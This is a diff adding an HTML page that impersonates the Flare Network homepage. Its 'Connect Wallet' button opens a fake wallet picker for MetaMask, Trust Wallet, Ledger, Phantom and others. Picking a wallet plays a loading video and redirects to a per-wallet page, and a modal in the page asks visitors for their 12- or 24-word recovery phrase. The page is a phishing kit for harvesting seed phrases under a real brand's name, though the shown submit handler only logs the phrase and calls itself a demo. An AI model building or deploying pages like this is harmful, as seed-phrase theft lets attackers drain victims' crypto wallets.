@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Flare Network - The blockchain for data</title>
+    <link rel="icon" href="FLR-iA8A7EPo.svg" type="image/x-icon">
+    <link href="styles.css" rel="stylesheet">
+    <style>
+        /* MODAL STYLES */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000; /* Ensure it's above everything */
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .modal-overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-content {
+            background-color: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            position: relative;
+            max-width: 28rem; /* Max width for the modal */
+            width: 90%; /* Responsive width */
+            transform: translateY(-50px);
+            opacity: 0;
+            transition: transform 0.3s ease, opacity 0.3s ease;
+        }
+
+        .modal-overlay.visible .modal-content {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .modal-close-button {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #666;
+            transition: color 0.2s ease;
+        }
+
+        .modal-close-button:hover {
+            color: #333;
+        }
+
+        /* WALLET CONNECT CLONE STYLES (copied and adapted from previous version) */
+        #walletMainContainer {
+            background-color: #ffffff;
+            box-shadow: none; /* No extra shadow, modal-content provides it */
+            border-radius: 1rem;
+            padding: 0; /* Padding handled by modal-content */
+            width: 100%;
+            max-width: 24rem;
+            margin: 0; /* Margin handled by flex centering in modal-overlay */
+        }
+
+        .wallet-header-section {
+            margin-bottom: 1.5rem;
+        }
+
+        .wallet-reown-tag {
+            display: inline;
+            background-color: #1a202c;
+            color: #ffffff;
+            font-size: 0.75rem;
+            font-weight: 600;
+            padding: 0.25rem 0.75rem;
+            border-radius: 9999px;
+            margin-bottom: 1rem;
+        }
+
+        .wallet-main-title {
+            font-size: 1.25rem;
+            line-height: 1.75rem;
+            font-weight: 700;
+            color: #1f2937;
+            text-align: right;
+            padding: 0.25rem 0.75rem;
+        }
+        @media (min-width: 768px) {
+            .wallet-main-title {
+                font-size: 1.5rem;
+                line-height: 2rem;
+            }
+        }
+
+        .wallet-list-message {
+            color: #4b5563;
+            font-size: 0.875rem;
+            margin-bottom: 1rem;
+        }
+
+        .wallet-list-container {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            max-height: 16rem;
+            overflow-y: auto;
+            padding-right: 0.5rem;
+        }
+        .wallet-list-container > li {
+            margin-bottom: 0.75rem;
+        }
+        .wallet-list-container > li:last-child {
+            margin-bottom: 0;
+        }
+
+        .wallet-item {
+            display: flex;
+            align-items: center;
+            background-color: #f9fafb;
+            padding: 0.75rem;
+            border-radius: 0.75rem;
+            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+            transition: all 0.2s ease-in-out;
+            cursor: pointer;
+        }
+
+        .wallet-item:hover {
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+        }
+
+        .wallet-item img {
+            width: 2.5rem;
+            height: 2.5rem;
+            border-radius: 0.5rem;
+            margin-right: 1rem;
+        }
+
+        .wallet-item span {
+            color: #1f2937;
+            font-weight: 500;
+        }
+
+        .wallet-universal-connect-section {
+            text-align: center;
+            margin-top: 1.5rem;
+        }
+
+        .wallet-universal-connect-section svg {
+            width: 4rem;
+            height: 4rem;
+            margin-left: auto;
+            margin-right: auto;
+            color: #9ca3af;
+            margin-bottom: 0.75rem;
+        }
+
+        .wallet-universal-connect-section p {
+            color: #4b5563;
+        }
+
+        /* Custom scrollbar styles */
+        .custom-scrollbar::-webkit-scrollbar {
+            width: 8px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 10px;
+        }
+        .custom-scrollbar::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+
+        /* NEW: Loading Overlay Styles */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black; /* Or any dark color */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000; /* Higher than modal */
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .loading-overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .loading-overlay video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover; /* Ensures video covers the area */
+        }
+
+        /* NEW: Phrase Input Modal Styles */
+        #phraseInputModal .modal-content {
+            max-width: 28rem; /* Keep consistent with wallet modal */
+            text-align: center;
+        }
+
+        #phraseInputModal .wallet-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1rem;
+            border-radius: 10px;
+        }
+
+        #phraseInputModal h2 {
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+            color: #1f2937;
+        }
+
+        #phraseInputModal p {
+            color: #4b5563;
+            margin-bottom: 1.5rem;
+        }
+
+        #phraseInputModal textarea {
+            width: calc(100% - 2rem); /* Adjust for padding */
+            padding: 1rem;
+            margin-bottom: 1.5rem;
+            border: 1px solid #ccc;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            resize: vertical; /* Allow vertical resizing */
+            min-height: 100px;
+        }
+
+        #phraseInputModal button {
+            background-color: #007bff;
+            color: white;
+            padding: 0.8rem 1.5rem;
+            border: none;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        #phraseInputModal button:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <div class="logo">
+                <span class="logo-text"><img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo">flare</span>
+            </div>
+
+            <nav class="nav" id="nav">
+                <a href="#" class="nav-link">Participate</a>
+                <a href="#" class="nav-link">Products</a>
+                <a href="#" class="nav-link">Developers</a>
+                <a href="#" class="nav-link">Network</a>
+                <a href="#" class="nav-link">News & Events</a>
+            </nav>
+
+            <button class="mobile-menu-btn" id="mobileMenuBtn">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="hero-video-bg">
+            <video autoplay muted loop playsinline>
+                <source src="media/home_hero_mobile.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+        </div>
+
+        <div class="hero-bg">
+            <div class="shape shape-1"></div>
+            <div class="shape shape-2"></div>
+            <div class="shape shape-3"></div>
+            <div class="shape shape-4"></div>
+        </div>
+
+        <div class="hero-content">
+            <div class="hero-icon">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="flare">
+                <div class="icon-shap"></div>
+            </div>
+
+            <h1 class="hero-title">The blockchain for data</h1>
+
+            <p class="hero-subtitle">
+                Flare is a full-stack layer 1 solution designed for data intensive use cases.
+            </p>
+
+            <button class="cta-button" id="openWalletModalBtn">Connect Wallet</button>
+        </section>
+
+    <div id="walletModal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <button class="modal-close-button" id="closeWalletModalBtn">×</button>
+            <div id="walletMainContainer">
+                <div class="wallet-header-section">
+                    <h1 class="wallet-main-title">Manual Kit</h1>
+                    <span class="wallet-reown-tag">reown</span>
+                </div>
+
+                <div id="walletListSection">
+                    <p class="wallet-list-message">Recommended :</p>
+
+                    <ul class="wallet-list-container custom-scrollbar">
+                        <li class="wallet-item"
+                            data-wallet-name="Metamask"
+                            data-loading-video="media/metamask.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.qYA89uEFCYsvUmWJ1_2otgHaHa?rs=1&pid=ImgDetMain"
+                            data-redirect-page="metamask.html">
+                            <img src="https://th.bing.com/th/id/OIP.qYA89uEFCYsvUmWJ1_2otgHaHa?rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Metamask Logo">
+                            <span>Metamask</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Trust Wallet"
+                            data-loading-video="media/trust.mp4"
+                            data-phrase-image="media/signal-2025-06-07-050439-removebg-preview.png"
+                            data-redirect-page="trustwallet.html">
+                            <img src="https://th.bing.com/th/id/OIP.JdIlpLhPz03zFounryCkVwHaHa?w=171&h=180&c=7&r=0&o=7&pid=1.7&rm=3" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Trust Wallet Logo">
+                            <span>Trust Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Coinbase Wallet"
+                            data-loading-video="media/coinbase.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.q60zb-LgXVF8J6-QwS2WEwHaHY?w=908&h=906&rs=1&pid=ImgDetMain"
+                            data-redirect-page="coinbase.html">
+                            <img src="https://th.bing.com/th/id/OIP.q60zb-LgXVF8J6-QwS2WEwHaHY?w=908&h=906&rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Coinbase Wallet Logo">
+                            <span>Coinbase Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Ledger"
+                            data-loading-video="media/ledger.mp4"
+                            data-phrase-image="https://styles.redditmedia.com/t5_7rc222/styles/communityIcon_2e19ie5q5sba1.png"
+                            data-redirect-page="ledger.html">
+                            <img src="https://styles.redditmedia.com/t5_7rc222/styles/communityIcon_2e19ie5q5sba1.png" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Ledger Logo">
+                            <span>Ledger</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Trezor Wallet"
+                            data-loading-video="media/trezor.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.zp7kUq_-fTgbpSaf392l0QHaHa?w=512&h=512&rs=1&pid=ImgDetMain"
+                            data-redirect-page="trezorwallet.html">
+                            <img src="https://th.bing.com/th/id/OIP.zp7kUq_-fTgbpSaf392l0QHaHa?w=512&h=512&rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Trezor Wallet">
+                            <span>Trezor Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Phantom Wallet"
+                            data-loading-video="media/phantom.mp4"
+                            data-phrase-image="https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM"
+                            data-redirect-page="phantomwallet.html">
+                            <img src="https://play-lh.googleusercontent.com/obRvW02OTYLzJuvic1ZbVDVXLXzI0Vt_JGOjlxZ92XMdBF_i3kqU92u9SgHvJ5pySdM" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Phantom wallet logo">
+                            <span>Phantom Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="OKX Wallet"
+                            data-loading-video="media/okx.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.PGNYkP1nNq6402I1zmkUiwAAAA?rs=1&pid=ImgDetMain"
+                            data-redirect-page="okxwallet.html">
+                            <img src="https://th.bing.com/th/id/OIP.PGNYkP1nNq6402I1zmkUiwAAAA?rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="OKX Logo">
+                            <span>OKX Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Rabby Wallet"
+                            data-loading-video="media/rabby.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.BOlkQ_fzzzVU-_j37Byg5AAAAA?w=379&h=283&rs=1&pid=ImgDetMain"
+                            data-redirect-page="rabbywallet.html">
+                            <img src="https://th.bing.com/th/id/OIP.BOlkQ_fzzzVU-_j37Byg5AAAAA?w=379&h=283&rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="RabbyLogo">
+                            <span>Rabby Wallet</span>
+                        </li>
+                        <li class="wallet-item"
+                            data-wallet-name="Uniswap Wallet"
+                            data-loading-video="media/uniswap.mp4"
+                            data-phrase-image="https://th.bing.com/th/id/OIP.eaQNSC4TxgcvfW2tsjIqzQHaHa?rs=1&pid=ImgDetMain"
+                            data-redirect-page="uniswapwallet.html">
+                            <img src="https://th.bing.com/th/id/OIP.eaQNSC4TxgcvfW2tsjIqzQHaHa?rs=1&pid=ImgDetMain" onerror="this.onerror=null;this.src='https://placehold.co/40x40/cccccc/333333?text=Wallet';" alt="Uniswap Logo">
+                            <span>Uniswap Wallet</span>
+                        </li>
+                    </ul>
+
+                    <div class="wallet-universal-connect-section">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>
+                        </svg>
+                        <p>Connect your wallet to get started</p>
+                    </div>
+                </div>
+            </div>
+            </div>
+    </div>
+
+    <div id="loadingOverlay" class="loading-overlay">
+        <video id="loadingVideo" muted playsinline></video>
+    </div>
+
+    <div id="phraseInputModal" class="modal-overlay hidden">
+        <div class="modal-content">
+            <button class="modal-close-button" id="closePhraseModalBtn">×</button>
+            <img id="phraseWalletIcon" class="wallet-icon" src="" alt="Wallet Icon">
+            <h2 id="phraseModalTitle">Connect with Your Wallet</h2>
+            <p>Please input your 12 or 24 word recovery phrase to connect.</p>
+            <textarea id="recoveryPhrase" placeholder="Enter your recovery phrase here..."></textarea>
+            <button id="connectPhraseBtn">Connect Wallet</button>
+        </div>
+    </div>
+    <section class="partners">
+        <div class="container">
+            <p class="partners-label">Building with the best</p>
+
+            <div class="partners-grid">
+                <div class="partner"><img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FElliptic.png&w=384&q=75" height="55" alt="Elliptic"></div>
+                <div class="partner layerzero">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FLayerZero_Logo_Full%201.png&w=640&q=75" height="55" alt="LayerZero">
+                </div>
+                <div class="partner hypernative">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fhypernative.png&w=640&q=75" height="55" alt="Hypernative">
+                </div>
+                <div class="partner google-cloud">
+                    <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FGoogle_Cloud.png&w=640&q=75" height="55" alt="Google Cloud">
+                </div>
+                <div class="partner ankr"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fankr-1.png&w=384&q=75" alt="Ankr"></div>
+                <div class="partner arkham"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FArkham.png&w=384&q=75" alt="Arkham"></div>
+                <div class="partner hextrust"><img height="55" src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FHexTrust.png&w=640&q=75" alt="HexTrust"></div>
+            </div>
+        </div>
+    </section>
+    <section class="flare-tech-section">
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>FOUNDATIONAL TECHNOLOGY</h4>
+                <div class="box pink">
+                    <strong><h3>Enshrined Data Protocols</h3></strong>
+                    <p>Flare’s protocols are integrated into the blockchain’s core, and inherit the economic security of the entire network</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink">
+                    <strong><h3>Ethereum Virtual Machine</h3></strong>
+                    <p>Flare is EVM compatible with out-of-the-box support for all your favorite tooling</p>
+                </div>
+            </div>
+            <div class="flare-box">
+                <div class="box pink">
+                    <strong><h3>Flare Stake</h3></strong>
+                </div>
+                <p>Flare uses a proof-of-stake (PoS) mechanism to ensure a significant and consistent level of economic security</p>
+            </div>
+        </div>
+
+        <div class="flare-center">
+            <div class="flare-video">
+                <video src="media/city_ori.mp4" autoplay loop muted></video>
+            </div>
+        </div>
+
+        <div class="flare-column">
+            <div class="flare-box">
+                <h4>NEW USE CASES</h4>
+                <div class="box pink">
+                    <strong><h2><img src="media/FAssets (1).svg" height="30" alt="FAssets"> FAssets →</h2></strong>
+                    <p>Securely explore XRPFi, BTCFi and DOGEFi</p>
+                </div>
+            </div>
+
+            <div class="flare-box">
+                <h4>ENSHRINED DATA PROTOCOLS</h4>
+                <div class="box pink">
+                    <strong><h2><img src="media/FDC-1.svg" height="30" alt="FDC">FDC →</h2></strong>
+                    <p>Reliably access external blockchain events and real-world APIs</p>
+                </div>
+
+                <div class="box pink">
+                    <strong><h2><img src="media/FTSO (1).svg" height="30" alt="FTSO"> FTSO →</h2></strong>
+                    <p>Easily integrate fast, secure, and decentralized price feeds</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    <section class="art-image">
+        <img src="media/fassets.webp" height="130" alt="FAssets">
+        <div>
+            <strong><p style="color: darkgrey;">FLARE FEATURED NEWS</p></strong>
+            <img src="media/FAssets-2.svg" height="60" style="display: inline-flexbox;" alt="FAssets logo"><img id="xrp" src="media/XRP.svg" height="90" style="text-align: right; display: inline-flexbox;" alt="XRP logo">
+            <p>FAssets v1.1 Launches on Songbird -<br> Unlocking Scalable FXRP Minting</p><br> <p>May 14. 2025</p>
+
+        </div>
+    </section>
+    <section class="fast-stats-section">
+        <div class="background-video-container">
+            <video src="media/home_fast_desktop.webm" autoplay muted loop playsinline></video>
+        </div>
+
+        <div class="pink-art-image">
+        </div>
+
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Fast</h1>
+                <div class="counter" data-target="233527978">233,527</div>
+                <p>1.6s avg block time with single-slot finality</p>
+            </div>
+        </div>
+    </section>
+    <br>
+    <section class="fast-stats-section" >
+        <div class="pink-art-image">
+        </div>
+        <div class="fast-content">
+            <div class="fast-text">
+                <h1>Decentralized</h1>
+                <div class="counter" data-target="33">33%</div>
+                <h3>100 Data providers</h3>
+                <p>Maximum Stake per data provider</p>
+            </div>
+        </div>
+        <div class="background-video-container"></div>
+        <video src="media/home_providers_desktop.webm" autoplay muted loop playsinline></video>
+    </section>
+    <section class="participate">
+        <h2 class="title">Participate in Flare</h2>
+
+        <div class="banner">
+            <img src="https://flare.network/_next/image?url=%2Fen%2Fstatic%2F1200x400.jpg&w=3840&q=75" alt="Flare Fair Banner" />
+        </div>
+        <div class="cards">
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fflaredrop_4x.png&w=3840&q=75" alt="FlareDrops" />
+                <h3>Get FlareDrops →</h3>
+                <p>Wrap FLR to earn rewards</p>
+            </div>
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2Fdandstake.png&w=384&q=75" alt="Delegate & Stake" />
+                <h3>Delegate & Stake →</h3>
+                <p>A simple and effective way of boosting rewards while contributing to Flare’s security</p>
+            </div>
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FVote_Hero.png&w=1920&q=75" alt="Vote" />
+                <h3>Vote →</h3>
+                <p>Participate in transparent, onchain governance to define the future of Flare</p>
+            </div>
+            <div class="card">
+                <img src="https://flare.network/_next/image?url=%2Fapi%2Fmedia%2Ffile%2FCommunity_Header.png&w=1920&q=75" alt="Community" />
+                <h3>Community →</h3>
+                <p>Come together, share ideas, and build</p>
+            </div>
+        </div>
+    </section>
+    <section class="newsletter-section">
+        <div class="newsletter-content">
+            <h2>Subscribe to the Flare Newsletter</h2>
+            <p>Join over 30,000 Flare community members. Sign up to the Flare newsletter today to hear the latest on product releases, ecosystem announcements and global events.</p>
+            <button class="subscribe-button">Subscribe</button>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="footer-top">
+            <div class="footer-brand">
+                <img src="https://flare.network/api/media/file/Flare.svg" alt="Flare Logo" class="footer-logo">
+                <span class="tagline">The blockchain for data</span>
+            </div>
+
+            <div class="footer-links">
+                <a href="#">Newsletter</a>
+                <a href="#">Contact</a>
+                <a href="#">Our Team</a>
+                <a href="#">Brand Assets</a>
+                <a href="#">Terms & Conditions</a>
+                <span>© Flare 2025</span>
+            </div>
+
+            <div class="social-icons">
+                <img src="https://www.bing.com/th/id/OIP.8SVgggxQcO5L6Dw_61ac4QHaEK?w=285&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="GitHub">
+                <img src="https://www.bing.com/th/id/OIP.Y6P1GkxkEoLoIRsS1wMZiwHaFj?w=254&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="YouTube">
+                <img src="https://www.bing.com/th/id/OIP.Cn9SAHCmTy8MEaixr8bqpAHaHa?w=172&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="LinkedIn">
+                <img src="https://www.bing.com/th/id/OIP.SqoeKJPmo667mmrM6IQCxwHaEK?w=263&h=211&c=8&rs=1&qlt=90&o=6&pid=3.1&rm=2" alt="Discord">
+                <img src="https://th.bing.com/th/id/OIP.ZweGejPwbT5wwshQ2-8qUQHaHa?w=178&h=180&c=7&r=0&o=5&pid=1.7" alt="X/Twitter">
+                <img src="https://th.bing.com/th/id/OIP.lYN2s7Dv1a4pLAVUaXMCVgHaHa?w=173&h=180&c=7&r=0&o=5&pid=1.7" alt="Telegram">
+            </div>
+        </div>
+
+        <div class="footer-bottom">
+            <h4>DEV LINKS</h4>
+            <div class="dev-links">
+                <a href="#">Flarescan →</a>
+                <a href="#">Flare P-Chain Explorer →</a>
+                <a href="#">Flare Systems Explorer →</a>
+            </div>
+        </div>
+    </footer>
+    <script>
+        // JavaScript for mobile menu toggle (from your original Flare page)
+        const mobileMenuBtn = document.getElementById('mobileMenuBtn');
+        const nav = document.getElementById('nav');
+
+        if (mobileMenuBtn && nav) {
+            mobileMenuBtn.addEventListener('click', () => {
+                nav.classList.toggle('active');
+            });
+        }
+
+        // JavaScript for the Wallet Connect Modal
+        const openWalletModalBtn = document.getElementById('openWalletModalBtn');
+        const closeWalletModalBtn = document.getElementById('closeWalletModalBtn');
+        const walletModal = document.getElementById('walletModal');
+
+        if (openWalletModalBtn && closeWalletModalBtn && walletModal) {
+            openWalletModalBtn.addEventListener('click', () => {
+                walletModal.classList.add('visible');
+            });
+
+            closeWalletModalBtn.addEventListener('click', () => {
+                walletModal.classList.remove('visible');
+            });
+
+            // Close modal when clicking outside the modal content
+            walletModal.addEventListener('click', (event) => {
+                if (event.target === walletModal) {
+                    walletModal.classList.remove('visible');
+                }
+            });
+        }
+
+        // Counter animation for Flare Network page (if needed)
+        document.querySelectorAll('.counter').forEach(counter => {
+            const target = +counter.dataset.target;
+            let current = 0;
+            const increment = target / 200; // Adjust speed
+
+            const updateCounter = () => {
+                if (current < target) {
+                    current += increment;
+                    counter.textContent = Math.floor(current).toLocaleString();
+                    requestAnimationFrame(updateCounter);
+                } else {
+                    counter.textContent = target.toLocaleString();
+                }
+            };
+            // You might want to trigger this when the element is in view
+            // For now, it runs on page load
+            // updateCounter();
+        });
+        
+
+        // NEW JAVASCRIPT FOR WALLET CLICK, LOADING, AND PHRASE INPUT
+
+        const walletItems = document.querySelectorAll('.wallet-item');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingVideo = document.getElementById('loadingVideo');
+        const phraseInputModal = document.getElementById('phraseInputModal');
+        const closePhraseModalBtn = document.getElementById('closePhraseModalBtn');
+        const phraseModalTitle = document.getElementById('phraseModalTitle');
+        const phraseWalletIcon = document.getElementById('phraseWalletIcon');
+        const recoveryPhraseInput = document.getElementById('recoveryPhrase');
+        const connectPhraseBtn = document.getElementById('connectPhraseBtn');
+
+        walletItems.forEach(item => {
+            item.addEventListener('click', (event) => {
+                event.preventDefault(); // Prevent default link behavior if any
+                const walletName = item.dataset.walletName;
+                const loadingVideoSrc = item.dataset.loadingVideo;
+                const phraseImageSrc = item.dataset.phraseImage;
+                const redirectPage = item.dataset.redirectPage; // Get the redirect page
+                showLoadingAndThenPhraseInput(walletName, loadingVideoSrc, phraseImageSrc, redirectPage);
+            });
+        });
+
+        if (closePhraseModalBtn) {
+            closePhraseModalBtn.addEventListener('click', () => {
+                phraseInputModal.classList.remove('visible');
+                recoveryPhraseInput.value = ''; // Clear input on close
+            });
+
+            phraseInputModal.addEventListener('click', (event) => {
+                if (event.target === phraseInputModal) {
+                    phraseInputModal.classList.remove('visible');
+                    recoveryPhraseInput.value = ''; // Clear input on close
+                }
+            });
+        }
+
+        if (connectPhraseBtn) {
+            connectPhraseBtn.addEventListener('click', () => {
+                const phrase = recoveryPhraseInput.value.trim();
+                if (phrase) {
+                    // Here you would typically send the phrase to your backend for validation/connection
+                    // For demonstration, we'll just log it and close the modal
+                    console.log("Recovery Phrase submitted:", phrase);
+                    alert("Wallet connection initiated! (This is a demo, no actual connection is made.)");
+                    phraseInputModal.classList.remove('visible');
+                    recoveryPhraseInput.value = ''; // Clear input after submission
+                } else {
+                    alert("Please enter your recovery phrase.");
+                }
+            });
+        }
+
+
+        function showLoadingAndThenPhraseInput(walletName, loadingVideoSrc, phraseImageSrc, redirectPage) {
+            // Hide the wallet selection modal
+            if (walletModal) {
+                walletModal.classList.remove('visible');
+            }
+
+            // Set the loading video source and show the loading overlay
+            if (loadingVideo && loadingOverlay) {
+                loadingVideo.src = loadingVideoSrc;
+                loadingOverlay.classList.add('visible');
+                loadingVideo.load(); // Load the video
+
+                // A flag to ensure redirection only happens once
+                let redirected = false;
+
+                const performRedirect = () => {
+                    if (!redirected) {
+                        redirected = true;
+                        loadingOverlay.classList.remove('visible'); // Hide loading overlay
+                        window.location.href = redirectPage; // Redirect to the specified page
+                    }
+                };
+
+                // Listen for when the video is ready to play
+                loadingVideo.oncanplaythrough = () => {
+                    console.log(`Video for ${walletName} is ready to play.`);
+                    loadingVideo.play().catch(error => {
+                        // Handle potential autoplay issues (e.g., browser blocking)
+                        console.error("Video autoplay failed:", error);
+                        // If autoplay fails, still try to redirect after a delay
+                        setTimeout(performRedirect, 2000); // Fallback after 2 seconds
+                    });
+                };
+
+                // Listen for when the video ends
+                loadingVideo.onended = () => {
+                    console.log(`Video for ${walletName} ended. Redirecting...`);
+                    performRedirect();
+                };
+
+                // Fallback timeout in case video events don't fire for some reason
+                // Adjust this delay based on your video length. 5 seconds is a common max.
+                setTimeout(performRedirect, 5000); 
+
+                // Optional: Listen for errors
+                loadingVideo.onerror = (e) => {
+                    console.error(`Error loading video for ${walletName}:`, e);
+                    // Redirect even on error, so the user isn't stuck
+                    performRedirect();
+                };
+            }
+        }
+    </script>
+</body>
+</html>
